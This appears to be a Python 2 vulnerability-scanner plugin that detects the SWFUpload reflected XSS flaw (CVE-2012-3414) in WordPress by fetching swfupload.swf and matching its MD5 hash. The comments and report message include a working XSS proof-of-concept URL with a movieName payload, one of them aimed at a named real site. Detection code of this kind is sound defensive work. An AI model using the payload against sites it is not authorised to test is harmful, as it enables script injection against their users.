#!/usr/bin/envpython
#-*-coding:utf-8-*-

# catalog-1-通用常见漏洞-
# name-wordpress 反射型XSS-
# description- 
# XSS in SWFUpload (CVE-2012-3414) 本插件仅是一次学习性编程，只检查wp-includes/js/swfupload/swfupload.swf文件是否存在。
# 对wp-includes/js/swfupload/swfupload.swf进行反编译分析，尽管swfupload.swf其对传入ExternalInterface.call的第二个参数
# 进行了安全编码，但对于函数名，即ExternalInterface.call的第一个参数没有进行安全编码。 而函数名中的部分字符可控，造成xss漏洞。
# 多谢zero大哥的提醒，让我改进了代码，增添了hash验证的方法来识别漏洞。 我目前测试了多个版本的wp，发现存在漏洞文件的hash是同
# 一个。如果还存在不同的hash，我会在后续的测试中加进来。
# 漏洞证明： http://www.80sec.com/wp-includes/js/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert(/xss/)}}//
# description-

from dummy import *
#
# 1-通用常见漏洞
# 2-敏感信息收集
# 3-服务配置缺陷
# 4-信息收集
# 5-应用程序漏洞
# 6-系统弱口令
# 7-其他漏洞
#

#WordpressURL跨站识别v1.0
import re
import urlparse
import md5

def assign(service,arg):
    #只适用于wordpress网站
    #此任务由cms识别插件产生,arg为网站url
    if service!="wordpress":
        return
    return True,arg

def audit(arg):
    url=arg
    #通过检查wordpress是否存在该url来识别是否存在xss
    code,head,res,errcode,_,errstr=curl.curl(url+'wp-includes/js/swfupload/swfupload.swf')
    if errcode:
        raise Exception(errcode,errstr)
    if code==200 and validate(res):
        security_info('Wordpress URL XSS Exits!Try '+url+'wp-includes/js/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert(/xss/)}}//')


def validate(res):
    val_hash='3a1c6cc728dddc258091a601f28a9c12'
    res_md5=md5.new(res)
    if val_hash==res_md5.hexdigest():
        return True
    else:
        return False


if __name__=='__main__':
    from dummy import *
    audit(assign('wordpress','http://www.abc.com/')[1])